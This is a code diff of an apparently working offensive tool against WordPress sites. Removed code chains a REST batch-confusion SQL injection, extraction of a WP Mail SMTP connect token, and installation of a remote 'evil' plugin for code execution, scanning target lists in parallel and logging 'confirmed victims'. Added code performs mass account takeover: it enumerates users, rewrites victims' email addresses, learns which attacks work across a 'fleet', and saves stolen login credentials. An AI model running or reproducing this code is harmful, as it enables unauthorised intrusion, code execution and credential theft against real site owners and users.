+            self.names.append(name)
+        if source not in self.sources:
+            self.sources.append(source)
+
+    @property
+    def label(self) -> str:
+        return self.names[0] if self.names else "id%d" % self.uid
+
+    @property
+    def via(self) -> str:
+        return "+".join(self.sources)
+
+
+@dataclass
+class Profile:
+    """What profile.php says about the session that is logged in right now."""
+    user_login: Optional[str] = None
+    user_email: Optional[str] = None
+    nickname: Optional[str] = None
+    user_id: Optional[int] = None
+
+
+@dataclass
+class Hit:
+    site: str
+    login_url: str
+    username: str
+    password: str
+    mode: str
+    campaign_id: int
+    user_id: Optional[int]
+    email: str
+    access: str
+    ts: str = field(default_factory=now_iso)
+    detail: str = ""
+
+    @property
+    def line(self) -> str:
+        """The one line written to the results file."""
+        return "%s#%s@%s" % (self.login_url, self.username, self.password)
+
+    @property
+    def administrator(self) -> bool:
+        return self.access == ADMIN
+
+
+@dataclass
+class SiteResult:
+    target: Target
+    users: List[UserRec] = field(default_factory=list)
+    counts: Dict[str, int] = field(default_factory=dict)
+    hits: List[Hit] = field(default_factory=list)
+    requests: int = 0
+    note: str = ""
+
+
+class Mailbox:
+    """
+    One address per (mode, user id), generated once and then reused.
+
+    A single shared takeover address is a correctness bug, not untidiness. The
+    connection rewrites user_email onto the victim, so once the first takeover
+    has landed, two accounts answer to the same address and wp_signon() resolves
+    it to whichever it prefers. The session then belongs to somebody else, so
+    profile.php reports the wrong user_login and the recorded credential is the
+    wrong account's - the exact way a real username degrades into a
+    placeholder. One address per victim removes the ambiguity at the source.
+    """
+
+    def __init__(self, template: str):
+        self.template = template
+        self._addresses: Dict[Tuple[str, Optional[int]], str] = {}
+
+    def get(self, mode: str, uid: Optional[int]) -> str:
+        key = (mode, uid)
+        address = self._addresses.get(key)
+        if address is None:
+            # The id keeps addresses distinct inside one run and across runs:
+            # only the account actually attacked ever answers to this one.
+            suffix = "new" if uid is None else str(uid)
+            address = (self.template.replace("{mode}", mode.lower())
+                       .replace("{uid}", suffix))
+            self._addresses[key] = address
+        return address
+
+
+# =============================================================================
+# results file
+# =============================================================================
+
+class VulnLog:
+    """
+    One line per hit, appended, flushed and fsynced the moment it is proven, so
+    an interrupted run still leaves working credentials on disk.
+
+        https://example.com/wp-login.php#username@password
+    """
+
+    def __init__(self, path: str):
+        self.path = path
+        self.count = 0
+        self._lock = asyncio.Lock()
+        self._seen = set()
+        directory = os.path.dirname(os.path.abspath(path))
+        if directory and not os.path.isdir(directory):
+            os.makedirs(directory, exist_ok=True)
+        if not os.path.exists(path):
+            open(path, "a", encoding="utf-8").close()
+
+    async def header(self, text: str) -> None:
+        async with self._lock:
+            with open(self.path, "a", encoding="utf-8") as fh:
+                fh.write("# %s  %s\n" % (now_iso(), text))
+                fh.flush()
+
+    async def write(self, hit: Hit, console: Optional["Console"]) -> bool:
+        line = hit.line
+        if line in self._seen:
             return False
-
-    def controls(self):
-        ok = self.s.expr_probe_many(["1=1", "1=2"])
-        ok_t, ok_f = ok[0], ok[1]
-        if ok_t and not ok_f:
-            return True
-        if ok_t and ok_f:
-            raise CampaignAbort(
-                "oracle responds TRUE to both 1=1 and 1=2 (rows are returned either way): "
-                "the injected author_exclude WHERE is not reaching the query (payload sanitized "
-                "to an id-list, custom core, or a security filter) OR the batch confusion no "
-                "longer maps the payload onto the posts handler.")
-        has = self.content_ok()
-        if not has:
-            raise CampaignAbort(
-                "no usable row channel: the queried type has zero rows of any reachable status "
-                "(the default installation always ships at least 'Hello world!' + 'Sample Page'; "
-                "an 'empty WordPress' with no content rows at all can therefore not be probed). "
-                "1=1 -> %s, 1=2 -> %s." % (ok_t, ok_f))
-        raise CampaignAbort(
-            "batch-confusion oracle failed although content rows exist (1=1 -> %s, 1=2 -> %s). "
-            "Possible causes: core patched; batch/embed routes disabled by a plugin; "
-            "the target is not a 5.6+ WordPress REST API; or a WAF rewrote the payload."
-            % (ok_t, ok_f))
-
-    def dialect(self):
-        for d, probes in {
-            "sqlite": ["(SELECT count(*) FROM sqlite_master)>0", "(SELECT unicode('A'))=65"],
-            "mysql": ["(SELECT count(*) FROM DUAL)>=0", "(SELECT ORD('A'))=65"],
-        }.items():
-            for p in probes:
-                try:
-                    if self.s.expr_probe(p):
-                        return d
-                except ProbeError:
-                    raise
-        raise CampaignAbort("could not identify the SQL dialect")
-
-    def _candidate_prefixes(self):
-        return ["", "wp_", "wp", "_", "wp2_", "wp2", "site_", "blog_", "cms_", "sqlite_", "xa_", "ps_"]
-
-    def _verify_table(self, table_name):
-        for probe in [
-            "(SELECT count(*) FROM %s)>0" % table_name,
-            "(SELECT count(*) FROM %s WHERE option_name=%s)>0" % (table_name, sq("siteurl")),
-        ]:
-            if not self.s.expr_probe(probe):
+        async with self._lock:
+            if line in self._seen:
                 return False
+            self._seen.add(line)
+            with open(self.path, "a", encoding="utf-8") as fh:
+                fh.write(line + "\n")
+                fh.flush()
+                os.fsync(fh.fileno())
+            self.count += 1
+        if console:
+            style = "bold green" if hit.administrator else "bold yellow"
+            console.print("  [%s]+ %s[/]" % (style, line))
+        else:
+            print("+ " + line)
         return True
 
-    def content_ok(self):
-        return bool(self.s.expr_probe("(SELECT count(*) FROM %s)>0" % self.s.table("posts")))
 
-    def table_prefix(self):
-        for p in self._candidate_prefixes():
-            ident = self.s.ident(p + "options")
-            try:
-                if self.s.expr_probe("(SELECT count(*) FROM %s)>0" % ident):
-                    if self._verify_table(ident):
-                        return p
-            except ProbeError:
-                raise
-        return self._prefix_from_metadata()
+# =============================================================================
+# adaptive campaign ordering, shared by every target in the run
+# =============================================================================
 
-    def _prefix_from_metadata(self):
-        if self.s.dialect == "sqlite":
-            exists = ("(SELECT count(*) FROM sqlite_master WHERE type='table' "
-                      "AND name LIKE '%%options')>0")
-            name_sub = ("(SELECT name FROM sqlite_master WHERE type='table' "
-                        "AND name LIKE '%%options' ORDER BY name LIMIT 1 OFFSET %d)")
-        else:
-            exists = ("(SELECT count(*) FROM information_schema.tables WHERE table_schema=database() "
-                      "AND table_name LIKE '%%options')>0")
-            name_sub = ("(SELECT table_name FROM information_schema.tables WHERE table_schema=database() "
-                        "AND table_name LIKE '%%options' ORDER BY table_name LIMIT 1 OFFSET %d)")
-        try:
-            present = self.s.expr_probe(exists)
-        except ProbeError:
-            raise
-        if not present:
-            raise CampaignAbort("could not locate any WordPress 'options' table")
-        for off in range(5):
-            sub = name_sub % off
-            try:
-                nlen = self.s.scalar_length(sub)
-                if nlen <= 0 or nlen > 160:
-                    continue
-                nm = self.s.scalar(sub, length=nlen)
-            except ProbeError:
-                raise
-            if nm.endswith("options"):
-                ident = self.s.ident(nm)
-                try:
-                    if self._verify_table(ident):
-                        return nm[: -len("options")]
-                except ProbeError:
-                    raise
-        raise CampaignAbort("options table found in metadata but none reads the 'siteurl' option")
-
-
-class Campaign:
-    OPT_TOKEN = "wp_mail_smtp_connect_token"
-    OPT_LIC = "wp_mail_smtp_connect"
-
-    def __init__(self, sink, threads=1, progress=None):
-        self.s = sink
-        self.threads = threads
-        self.progress = progress
-
-    def options_state(self):
-        t = self.s
-        conds = [
-            "(SELECT count(*) FROM %s WHERE option_name=%s)>0" % (t.table("options"), sq(self.OPT_TOKEN)),
-            "(SELECT count(*) FROM %s WHERE option_name=%s)>0" % (t.table("options"), sq(self.OPT_LIC)),
-            "(SELECT count(*) FROM %s WHERE option_name=%s)>0" % (t.table("options"), sq("active_plugins")),
-        ]
-        tok, lic, has_ap = self.s.expr_probe_many(conds)
-        lite = None
-        if has_ap:
-            lite = t.expr_probe("(SELECT instr(%s,%s))>0"
-                                % (t.option_row("option_value", "active_plugins", order=""),
-                                   sq("wp-mail-smtp")))
-        return {"connect_token": bool(tok), "connect_license": bool(lic),
-                "active_plugins": bool(has_ap), "lite_plugin": bool(lite)}
-
-    def sub_token(self):
-        return self.s.option_row("option_value", self.OPT_TOKEN)
-
-    def extract(self, length=None):
-        return self.s.scalar(self.sub_token(), length=length, threads=self.threads,
-                             progress=self.progress)
-
-    def verify_samples(self, token, sub):
-        n = len(token)
-        picks = sorted({1, (n + 1) // 2, n})
-        conds = [self.s.char_eq(sub, p, token[p - 1]) for p in picks]
-        vals = self.s.probe_many(conds)
-        return all(vals)
-
-    def fire(self, token, url_zip):
-        body = {"action": "wp_mail_smtp_connect_process", "oth": token, "file": url_zip}
-        return self.s.t.post_raw(self.s.t.ajax_path(), body, form=True)
-
-    @staticmethod
-    def analyze_fire(st, headers, raw):
-        """Structurally analyze any admin-ajax reply, not raw-string dependent."""
-        sig = {"http": st, "content_type": (headers.get("Content-Type") or "").lower(),
-               "raison": "unknown", "parsed": None, "message": "", "verdict": "unknown"}
-        body = (raw or "").strip()
-        if st == 400 and (body == "0" or body == ""):
-            sig["raison"] = "zero-body"; sig["verdict"] = "no_hook"; return sig
-        if st in (403, 429):
-            sig["raison"] = "blocked-status"; sig["verdict"] = "blocked"; return sig
-        j = None
-        start = body.find("{")
-        if start >= 0:
-            try:
-                j = json.loads(body[start:])
-            except ValueError:
-                j = None
-        if j is None:
-            if body.lower().startswith(("<html", "<!doctype html")):
-                sig["raison"] = "html"; sig["verdict"] = "blocked"; return sig
-            if body:
-                sig["raison"] = "non-json"; sig["verdict"] = "unknown"; sig["message"] = body[:200]
-                return sig
-            sig["raison"] = "empty"; sig["verdict"] = "no_hook"; return sig
-        sig["parsed"] = j
-        success = j.get("success")
-        msg = j.get("data") if isinstance(j.get("data"), str) else None
-        if msg is None and isinstance(j.get("message"), str):
-            msg = j["message"]
-        sig["message"] = msg or ""
-        low = (msg or "").lower()
-        if any(w in low for w in ("installed", "activated", "upgraded", "pro version", "plugin", "success")):
-            sig["verdict"] = "installed"
-        elif any(w in low for w in ("secret", "nonce", "permission", "forbidden", "token", "invalid")):
-            sig["verdict"] = "gate_rejected"
-        elif any(w in low for w in ("license", "license key", "expired")):
-            sig["verdict"] = "license_rejected"
-        elif success is True:
-            sig["verdict"] = "installed"
-        elif success is False:
-            sig["verdict"] = "rejected"
-        else:
-            sig["verdict"] = "unknown"
-        return sig
-
-    def postchecks(self, plugin_slug):
-        t = self.s
-        conds = [
-            "(SELECT count(*) FROM %s WHERE option_name=%s)>0" % (t.table("options"), sq(self.OPT_TOKEN)),
-            "(SELECT instr(%s,%s))>0" % (t.option_row("option_value", "active_plugins", order=""),
-                                         sq(plugin_slug)),
-            "(SELECT instr(%s,%s))>0" % (t.option_row("option_value", "active_plugins", order=""),
-                                         sq("wp-mail-smtp")),
-        ]
-        tok, evil, lite = t.expr_probe_many(conds)
-        return {"token_row_gone": not bool(tok), "evil_plugin_active": bool(evil),
-                "lite_plugin": bool(lite)}
-
-
-def aio_available():
-    """True when the aiohttp accelerator is importable on this interpreter."""
-    return bool(HAS_AIOHTTP)
-
-
-def scan_target(target, url_zip=None, do_fire=True, dialect="auto", prefix=None,
-                length=None, timeout=60.0, retries=2, threads=1,
-                plugin_slug="evilprobe", transport="auto",
-                echo=None, progress_start=None, progress=None, progress_end=None):
-    """Run the full verified chain once against one WordPress root.
-
-    Never raises for host-level issues: returns a dict describing the outcome.
-      host, ok, verdict, error, token, requests, seconds,
-      fire_status, fire_message, fire_verdict, token_row_gone, evil_plugin_active
-    ok == CHAIN CONFIRMED (fire installed AND far-side token row gone AND the
-    planted slug listed in active_plugins). The server message is informational.
-
-    transport: 'auto' -> aiohttp when importable, else the urllib+threads path;
-    'threads' -> always urllib+threads; 'sync' -> strictly sequential urllib.
-
-    progress_start(total) is called just before the character extraction begins
-    (the value length is already known then), progress(done) is called every
-    batch round so a UI bar stays live, progress_end() runs when it finishes.
+class CampaignMemory:
     """
-    summary = {"host": target, "ok": False, "verdict": "unknown", "error": None,
-               "token": None, "requests": 0, "seconds": 0.0,
-               "fire_status": None, "fire_message": "", "fire_verdict": None,
-               "token_row_gone": None, "evil_plugin_active": None}
-    tgt = None
-    t0 = time.time()
+    Learns which campaign ids actually run on this fleet.
 
-    def say(msg):
-        if echo:
-            echo(msg)
+    WordPress installations share plugins, themes and hosts, so a campaign id
+    that works on one target is very likely to work on the next. Every accepted
+    reply bumps that id, and later targets try the proven ids first. That turns
+    a 40-campaign blind sweep on target N into a two or three request probe for
+    every target after the first.
+    """
 
-    try:
-        tgt = Target(target, timeout=timeout, retries=retries)
-        sink = SQLiSink(tgt, dialect=("sqlite" if dialect == "auto" else dialect),
-                        prefix=prefix, length=length, threads=threads, transport=transport)
-        sink.status = "any"
-        disc = Discovery(sink)
+    def __init__(self) -> None:
+        self.hits: Dict[int, int] = {}
 
-        disc.endpoints()
-        say("REST batch endpoint: %s" % tgt.batch_path())
+    def record(self, campaign_id: int) -> None:
+        self.hits[campaign_id] = self.hits.get(campaign_id, 0) + 1
 
-        if dialect == "auto":
-            got = disc.dialect()
-            sink.dialect = got
-            sink.sub, sink.cp = ("SUBSTR", "unicode") if got == "sqlite" else ("SUBSTRING", "ord")
-            say("dialect auto-detected: %s" % got)
-        else:
-            say("dialect forced: %s" % sink.dialect)
-
-        if not prefix:
-            sink.prefix = disc.table_prefix()
-            say("table prefix discovered: %r (options = %soptions)" % (sink.prefix, sink.prefix))
-        else:
-            say("table prefix forced: %r" % sink.prefix)
-
-        disc.controls()
-        say("oracle controls passed (1=1 -> rows, 1=2 -> empty)")
-
-        cam = Campaign(sink, threads=threads, progress=progress)
-        st0 = cam.options_state()
-        say("options state: token=%s license=%s active_plugins=%s lite_plugin=%s" % (
-            st0["connect_token"], st0["connect_license"], st0["active_plugins"], st0["lite_plugin"]))
-        if not st0["connect_token"]:
-            raise CampaignAbort(
-                "connect token row absent: the WP Mail SMTP connect wizard has not run to that "
-                "state here (or this host reads with a wrong dialect/prefix).")
-        if not st0["lite_plugin"]:
-            say("warning: active_plugins does not list wp-mail-smtp")
-
-        total = length or sink.length_opt or sink.scalar_length(cam.sub_token())
-        if progress_start:
-            progress_start(total)
-        token = cam.extract(length=total)
-        if progress_end:
-            progress_end()
-        summary["token"] = token
-        say("extracted connect token: %s" % token)
-
-        if not do_fire:
-            summary["verdict"] = "extracted (%d chars)" % len(token)
-            return summary
-        if not url_zip:
-            raise CampaignAbort("fire requested but no --url-zip payload URL was provided")
-
-        st, headers, raw = cam.fire(token, url_zip)
-        sig = cam.analyze_fire(st, headers, raw)
-        summary["fire_status"] = st
-        summary["fire_message"] = sig["message"]
-        summary["fire_verdict"] = sig["verdict"]
-        say("connect_process -> HTTP %s : %r [%s]" % (st, raw[:200], sig["verdict"]))
-
-        post = cam.postchecks(plugin_slug)
-        summary["token_row_gone"] = post["token_row_gone"]
-        summary["evil_plugin_active"] = post["evil_plugin_active"]
-        say("post-fire far-side: token_row_gone=%s evil_plugin_active=%s" % (
-            post["token_row_gone"], post["evil_plugin_active"]))
-
-        ok = (sig["verdict"] == "installed") and post["token_row_gone"] and post["evil_plugin_active"]
-        summary["ok"] = ok
-        summary["verdict"] = "CHAIN CONFIRMED" if ok else "partial/inconclusive (see above)"
-        return summary
-    except (CampaignAbort, ProbeError) as exc:
-        summary["error"] = str(exc)
-        summary["verdict"] = "error"
-        return summary
-    except Exception as exc:
-        summary["error"] = "%s: %s" % (type(exc).__name__, exc)
-        summary["verdict"] = "error"
-        return summary
-    finally:
-        summary["seconds"] = round(time.time() - t0, 1)
-        if tgt is not None:
-            summary["requests"] = tgt.request_count()
+    def ordered(self, limit: int) -> List[int]:
+        proven = sorted((c for c, n in self.hits.items() if n and c <= limit),
+                        key=lambda c: (-self.hits[c], c))
+        rest = [c for c in range(1, limit + 1) if c not in self.hits]
+        return proven + rest
 
 
-def load_targets(path):
-    """Read a list of WordPress roots, one per line (blank lines and # comments skipped)."""
-    hosts = []
-    with open(path, encoding="utf-8-sig") as f:
-        for ln in f:
-            ln = ln.strip()
-            if not ln or ln.startswith("#"):
-                continue
-            host = ln.split()[0]
-            if "://" not in host:
-                host = "http://" + host
-            hosts.append(host)
-    if not hosts:
-        raise CampaignAbort("sites list %r has no usable target lines" % path)
-    return hosts
+# =============================================================================
+# async HTTP
+# =============================================================================
+
+class Resp:
+    __slots__ = ("status", "text", "final")
+
+    def __init__(self, status: int, text: str, final: str):
+        self.status = status
+        self.text = text
+        self.final = final
 
 
-_VULN_LOCK = threading.Lock()
+class Client:
+    """One aiohttp session per target: own cookie jar, keep-alive connections."""
+
+    def __init__(self, target: Target, timeout: float = 12.0,
+                 insecure: bool = False):
+        self.t = target
+        self.timeout = aiohttp.ClientTimeout(total=timeout)
+        self.ssl = False if insecure else None
+        self.jar = aiohttp.CookieJar(unsafe=True, quote_cookie=False)
+        self.session: Optional[aiohttp.ClientSession] = None
+        self.requests = 0
+
+    async def __aenter__(self) -> "Client":
+        self.session = aiohttp.ClientSession(
+            cookie_jar=self.jar,
+            headers={"User-Agent": UA, "Accept": "*/*"},
+            timeout=self.timeout,
+            connector=aiohttp.TCPConnector(limit=0, limit_per_host=0,
+                                          keepalive_timeout=60,
+                                          ttl_dns_cache=300),
+        )
+        return self
+
+    async def __aexit__(self, *exc) -> None:
+        if self.session is not None:
+            await self.session.close()
+            self.session = None
+
+    async def get_follow(self, path: str, hops: int = 5) -> Resp:
+        """GET, following same-origin redirects so the final URL is knowable."""
+        url = self.t.abs(path)
+        status, text, final = 0, "", path
+        for _ in range(hops + 1):
+            self.requests += 1
+            async with self.session.get(url, allow_redirects=False,
+                                        ssl=self.ssl) as resp:
+                status = resp.status
+                text = (await resp.read()).decode("utf-8", "replace")
+                final = str(resp.url)
+            if status not in (301, 302, 303, 307, 308):
+                break
+            location = resp.headers.get("Location")
+            if not location:
+                break
+            nxt = urllib.parse.urljoin(final, location)
+            parts = urllib.parse.urlsplit(nxt)
+            if parts.netloc and parts.netloc != self.t.netloc:
+                break
+            url = nxt
+            path = (parts.path or "/") + (("?" + parts.query) if parts.query
+                                          else "")
+        return Resp(status, text, path)
+
+    async def post(self, path: str, data: Any,
+                   referer: Optional[str] = None) -> Resp:
+        url = self.t.abs(path)
+        self.requests += 1
+        async with self.session.post(
+                url, data=data, allow_redirects=False, ssl=self.ssl,
+                headers={"Content-Type": "application/x-www-form-urlencoded",
+                         "Referer": referer or url}) as resp:
+            text = (await resp.read()).decode("utf-8", "replace")
+            return Resp(resp.status, text, str(resp.url))
 
 
-def append_vuln(path, host, seconds=0.0, token=None):
-    """Append one CONFIRMED victim promptly (flush on every append). Safe to call from the
-    parallel host workers (appends are serialized)."""
-    with _VULN_LOCK:
-        with open(path, "a", encoding="utf-8") as f:
-            f.write("[CONFIRMED] %s  (%.0fs)%s\n" % (
-                host, seconds, ("  token=%s" % token) if token else ""))
-            f.flush()
+# =============================================================================
+# user discovery - WordPress only, no wordlist of any kind
+# =============================================================================
+
+def _store(users: Dict[int, UserRec], uid: Any, name: Optional[str],
+           source: str) -> None:
+    if not isinstance(uid, int) or isinstance(uid, bool) or uid <= 0:
+        return
+    rec = users.get(uid)
+    if rec is None:
+        rec = users[uid] = UserRec(uid)
+    rec.add_name(name, source)
 
 
-def scan_targets(ui, targets, do_fire=True, url_zip=None, dialect="auto", prefix=None,
-                 length=None, timeout=60.0, retries=2, threads=2, workers=2,
-                 plugin_slug="evilprobe", vuln_out="vuln.txt", transport="auto", on_host=None):
-    """Scan a list of hosts through the shared single-host chain, scanning `workers` hosts
-    concurrently (each host keeps its own per-batch `threads` parallelism). Every proven victim
-    is appended to vuln_out on the spot (lock-serialized). on_host(host, r) fires after each
-    host's result (used by the local build for lab-only byte-compares/marker checks).
-
-    Returns an exit code: 0 = run completed (--no-fire, or >=1 CONFIRMED), 1 = zero confirmed.
-    The wall-clock for N hosts is ~one host's runtime with enough workers, and long lists keep
-    their throughput instead of degrading linearly."""
-    ui.info("targets: %d site(s); fire=%s; hosts-in-parallel=%d; threads-per-host=%d" % (
-        len(targets), "OFF (--no-fire)" if not do_fire else "ON",
-        max(1, min(len(targets), workers)), threads))
-    if not do_fire:
-        ui.info("--no-fire: extraction only; nothing is appended")
-
-    pool = max(1, min(len(targets), workers))
-    lock = threading.Lock()
-    rows = []
-
-    def work(it):
-        i, host = it
-        try:
-            ui.host_header(i, len(targets), host)
-            bar = ui.bar("extracting token: %s" % host)
-            r = scan_target(host, url_zip=url_zip, do_fire=do_fire, dialect=dialect,
-                            prefix=prefix, length=length, timeout=timeout, retries=retries,
-                            threads=threads, plugin_slug=plugin_slug, transport=transport,
-                            echo=ui.step, progress_start=bar.start, progress=bar.update,
-                            progress_end=bar.stop)
-            if on_host:
-                try:
-                    on_host(host, r)
-                except Exception as exc:
-                    ui.warn("on_host hook error for %s: %s" % (host, exc))
-            if r["token"]:
-                ui.token(r["token"], r["requests"], r["seconds"])
-            if r["ok"]:
-                append_vuln(vuln_out, host, seconds=r["seconds"], token=r["token"])
-                ui.confirmed(host, r["seconds"], vuln_out)
-                res = "CONFIRMED"
-            elif r["error"]:
-                ui.failed(host, r["error"])
-                res = "error"
-            else:
-                ui.inconclusive(host, r["verdict"])
-                res = r["verdict"]
-            with lock:
-                rows.append((i, host, res, r["requests"], r["seconds"]))
-        except Exception as exc:
-            ui.failed(host, "%s: %s" % (type(exc).__name__, exc))
-            with lock:
-                rows.append((i, host, "error", 0, 0.0))
-
-    ordered = sorted(enumerate(targets, 1), key=lambda kv: kv[0])
-    if pool > 1:
-        with ThreadPoolExecutor(max_workers=pool) as ex:
-            list(ex.map(work, ordered))
-    else:
-        for it in ordered:
-            work(it)
-
-    rows = [(host, res, reqs, secs) for _, host, res, reqs, secs in sorted(rows)]
-    confirmed = sum(1 for r in rows if r[1] == "CONFIRMED")
-    ui.summary(rows, confirmed, len(targets), (vuln_out if do_fire and confirmed else None))
-    if not do_fire:
-        ui.info("scan completed; --no-fire, nothing proven and nothing appended")
-        return 0
-    return 0 if confirmed else 1
-
-
-def ask_sites_path():
-    """Interactive helper: ask for the user's sites-list txt. None when not a TTY or blank."""
-    if not sys.stdin.isatty():
-        return None
-    try:
-        v = input("path to your sites list .txt (Enter to scan a single target): ").strip()
-    except (EOFError, KeyboardInterrupt):
-        return None
-    return v or None
-
-
-def ask(label, default=None):
-    """Interactive input; falls back to `default`. Raises CampaignAbort when stdin is
-    not a terminal and there is no default to fall back to."""
-    if not sys.stdin.isatty():
-        if default is not None:
-            return default
-        raise CampaignAbort("--%s required when stdin is not a terminal" % label)
-    try:
-        v = input("%s%s: " % (label, (" [%s]" % default) if default is not None else "")).strip()
-    except (EOFError, KeyboardInterrupt):
-        v = ""
-    if v:
-        return v
-    if default is not None:
-        return default
-    raise CampaignAbort("--%s required (no default)" % label)
-
-
-def ask_int(label, default=None, lo=1, hi=64):
-    v = ask(label, default)
-    try:
-        i = int(v)
-    except (TypeError, ValueError):
-        raise CampaignAbort("--%s must be an integer (got %r)" % (label, v))
-    return max(lo, min(hi, i))
-
-
-class UI:
-    """Console with rich colors/panels/tables/progress, auto-falling back to plain
-    tagged text ([*]/[+]/[-]/[!]) when rich is missing or --plain is set."""
-
-    def __init__(self, plain=False):
-        self.use_rich = False
-        self.console = None
-        self._bar_lock = threading.Lock()
-        self._shared_p = None
-        self._bar_refs = 0
-        try:
-            from rich.console import Console
-            from rich.panel import Panel
-            from rich.progress import (BarColumn, Progress, TaskProgressColumn,
-                                       TextColumn, TimeElapsedColumn)
-            from rich.table import Table
-            from rich.text import Text
-            if plain:
-                raise ImportError("plain mode")
-            self._Console = Console
-            self._Panel = Panel
-            self._Table = Table
-            self._Progress = Progress
-            self._BarColumn = BarColumn
-            self._TextColumn = TextColumn
-            self._TaskProgressColumn = TaskProgressColumn
-            self._TimeElapsedColumn = TimeElapsedColumn
-            self._Text = Text
-            self.console = Console(highlight=False)
-            self.use_rich = True
-        except Exception:
-            self.use_rich = False
-
-    def _p(self, tag, color, msg):
-        if self.use_rich:
-            self.console.print(self._Text(tag, style=color), msg)
-        else:
-            print(tag + msg)
-
-    def banner(self, title, subtitle=None):
-        if self.use_rich:
-            t = self._Text(title, style="bold white")
-            if subtitle:
-                t.append("\n" + subtitle, style="dim")
-            self.console.print(self._Panel(t, border_style="cyan", expand=False))
-        else:
-            print("=" * 70)
-            print(title)
-            if subtitle:
-                print(subtitle)
-            print("=" * 70)
-
-    def info(self, msg):
-        self._p("[*] ", "cyan", msg)
-
-    def good(self, msg):
-        self._p("[+] ", "green", msg)
-
-    def bad(self, msg):
-        self._p("[-] ", "bold red", msg)
-
-    def warn(self, msg):
-        self._p("[!] ", "bold yellow", msg)
-
-    def step(self, msg):
-        self.info(msg)
-
-    def host_header(self, i, n, host):
-        if self.use_rich:
-            self.console.rule(" [%d/%d] %s " % (i, n, host), style="magenta")
-        else:
-            print("-" * 70)
-            print("[%d/%d] %s" % (i, n, host))
-
-    def token(self, token, reqs, secs):
-        self.info("token: %s  (%d requests, %.0fs)" % (token, reqs, secs))
-
-    def confirmed(self, host, secs, path):
-        if self.use_rich:
-            self.console.print(self._Text("   CONFIRMED  ", style="bold white on green"),
-                               self._Text("%s  (%.0fs)" % (host, secs)),
-                               self._Text("-> saved in %s" % path, style="dim"))
-        else:
-            print("[+] CONFIRMED %s (%.0fs) -> %s" % (host, secs, path))
-
-    def failed(self, host, err):
-        if self.use_rich:
-            self.console.print(self._Text("   NOT EXPLOITABLE  ", style="bold white on red"),
-                               self._Text(host, style="dim"), self._Text(" : %s" % err))
-        else:
-            print("[-] NOT EXPLOITABLE %s : %s" % (host, err))
-
-    def inconclusive(self, host, verdict):
-        self._p("[?] ", "dim", "%s -> %s" % (host, verdict))
-
-    def summary(self, rows, confirmed_n, total_n, vuln_path=None):
-        if self.use_rich:
-            t = self._Table(title="Scan summary", border_style="blue")
-            t.add_column("host")
-            t.add_column("result")
-            t.add_column("req", justify="right")
-            t.add_column("sec", justify="right")
-            for host, res, reqs, secs in rows:
-                style = "green" if res == "CONFIRMED" else ("red" if res == "error" else "dim")
-                t.add_row(host, res, str(reqs), "%.0f" % secs, style=style)
-            self.console.print(t)
-            tail = "  ->  saved in %s" % vuln_path if vuln_path else ""
-            self.console.print(self._Text("%d/%d CONFIRMED%s" % (confirmed_n, total_n, tail),
-                                          style="bold green" if confirmed_n else "bold dim"))
-        else:
-            for host, res, reqs, secs in rows:
-                print("%-5s %-12s %6s req %6.0fs  %s" % (res, res, reqs, secs, host))
-            print("[*] %d/%d CONFIRMED%s" % (confirmed_n, total_n,
-                                             ("  ->  %s" % vuln_path) if vuln_path else ""))
-        return confirmed_n
-
-    def ask(self, label, default=None):
-        return ask(label, default)
-
-    def ask_int(self, label, default=None, lo=1, hi=64):
-        return ask_int(label, default, lo=lo, hi=hi)
-
-    def ask_sites(self):
-        return ask_sites_path()
-
-    def bar(self, label="extracting token"):
-        return ProgressBar(self, label)
-
-
-class ProgressBar:
-    """Thread-safe per-host task inside ONE shared rich Progress region, so concurrent host
-    workers each get their own live progress line without clobbering each other on screen.
-    Plain mode degrades to a no-op (the tagged text lines already stream)."""
-
-    def __init__(self, ui, label="extracting token"):
-        self.ui = ui
-        self._label = label
-        self._p = None
-        self._task = None
-
-    @property
-    def live(self):
-        return self._task is not None
-
-    def start(self, total):
-        if not self.ui.use_rich:
-            return
-        with self.ui._bar_lock:
-            if self.ui._shared_p is None:
-                p = self.ui._Progress(
-                    self.ui._TextColumn("[progress.description]{task.description}"),
-                    self.ui._BarColumn(bar_width=22),
-                    self.ui._TaskProgressColumn(),
-                    self.ui._TimeElapsedColumn(),
-                    console=self.ui.console)
-                p.start()
-                self.ui._shared_p = p
-            self._p = self.ui._shared_p
-            self._task = self._p.add_task(self._label[:44], total=total)
-            self.ui._bar_refs += 1
-
-    def update(self, done):
-        if self._task is None:
-            return
-        with self.ui._bar_lock:
-            if self._task is not None:
-                try:
-                    self._p.update(self._task, completed=done)
-                except Exception:
-                    pass
-
-    def stop(self):
-        if self._task is None:
-            return
-        with self.ui._bar_lock:
-            if self._task is None:
-                return
+async def discover_via_rest(client: Client, max_pages: int = 3
+                            ) -> Dict[int, UserRec]:
+    """
+    /wp-json/wp/v2/users is public by default and returns id + slug + name, one
+    request per 100 accounts - the cheapest authoritative channel. Both the
+    pretty and the ?rest_route= form are tried, because plain permalinks disable
+    /wp-json/.
+    """
+    found: Dict[int, UserRec] = {}
+    for page in range(1, max_pages + 1):
+        got_any = False
+        for template in ("/wp-json/wp/v2/users?per_page=100&page=%d&context=embed",
+                         "/?rest_route=/wp/v2/users&per_page=100&page=%d"):
+            path = template % page
             try:
-                self._p.remove_task(self._task)
+                resp = await client.get_follow(path)
             except Exception:
-                pass
-            self._task = None
-            self._p = None
-            self.ui._bar_refs -= 1
-            if self.ui._bar_refs <= 0 and self.ui._shared_p is not None:
-                try:
-                    self.ui._shared_p.stop()
-                except Exception:
-                    pass
-                self.ui._shared_p = None
+                continue
+            data = parse_json_loose(resp.text)
+            if not isinstance(data, list) or not data:
+                if got_any:
+                    return found
+                continue
+            got_any = True
+            for entry in data:
+                if not isinstance(entry, dict):
+                    continue
+                _store(found, entry.get("id"),
+                       entry.get("slug") or entry.get("name"), "rest")
+            if len(data) < 100:
+                return found
+        if not got_any:
+            break
+    return found
 
 
-"""GENERAL PoC CLI source. The build harness embeds this file (minus its two import
-lines) behind the complete engine into the self-contained poc_sqli_wpms_general.py.
+async def resolve_slugs(client: Client, slugs: Sequence[str],
+                        threads: int) -> Dict[int, UserRec]:
+    """Turn slugs into ids with /wp-json/wp/v2/users?slug=. One request each."""
+    found: Dict[int, UserRec] = {}
+    sem = asyncio.Semaphore(max(1, threads))
 
-Scanner for the WP-core batch-confusion SQLi -> WP Mail SMTP raw-token gate -> RCE.
-Identical verified logic to the local build (both call the shared scan_target()).
+    async def one(slug: str):
+        path = "/wp-json/wp/v2/users?slug=%s&per_page=1" % urllib.parse.quote(slug)
+        async with sem:
+            try:
+                resp = await client.get_follow(path)
+            except Exception:
+                return None
+        data = parse_json_loose(resp.text)
